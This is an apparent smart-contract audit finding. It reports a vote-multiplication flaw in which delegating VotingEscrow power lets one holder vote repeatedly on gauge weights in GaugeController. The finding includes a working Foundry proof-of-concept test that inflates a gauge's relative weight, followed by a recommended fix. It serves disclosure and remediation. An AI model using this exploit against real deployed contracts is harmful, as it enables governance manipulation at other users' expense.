---
id: 25744
severity: "Crit/High"
---

# Voters from VotingEscrow can vote infinite times in vote_for_gauge_weights() of GaugeController

## Description



## Proof of Concept

`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. The `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.

Due to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.

A POC was built in Foundry, add the following test to `GaugeController.t.sol`:

```solidity
function testDelegateSystemMultipleVoting() public {
    vm.deal(user1, 100 ether);
    vm.startPrank(gov);
    gc.add_gauge(user1);
    gc.change_gauge_weight(user1, 100);
    vm.stopPrank();

    vm.deal(user2, 100 ether);
    vm.startPrank(gov);
    gc.add_gauge(user2);
    gc.change_gauge_weight(user2, 100);
    vm.stopPrank();

    uint256 v = 10 ether;

    vm.startPrank(user1);
    ve.createLock{value: v}(v);
    gc.vote_for_gauge_weights(user1, 10_000);
    vm.stopPrank();

    vm.startPrank(user2);
    ve.createLock{value: v}(v);
    gc.vote_for_gauge_weights(user2, 10_000);
    vm.stopPrank();

    uint256 expectedWeight_ = gc.get_gauge_weight(user1);

    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);

    uint256 numDelegatedTimes_ = 20;

    for (uint i_; i_ < numDelegatedTimes_; i_++) {
        address fakeUserI_ = vm.addr(i_ + 27); // random num
        vm.deal(fakeUserI_, 1);

        vm.prank(fakeUserI_);
        ve.createLock{value: 1}(1);

        vm.prank(user1);
        ve.delegate(fakeUserI_);

        vm.prank(fakeUserI_);
        gc.vote_for_gauge_weights(user1, 10_000);
    }

    // assert that the weight is approx numDelegatedTimes_ more than expected
    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);

    // relative weight has been increase by a lot, can be increased even more if wished
    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);
}
```

## Recommendation

The vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past.

Additionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.
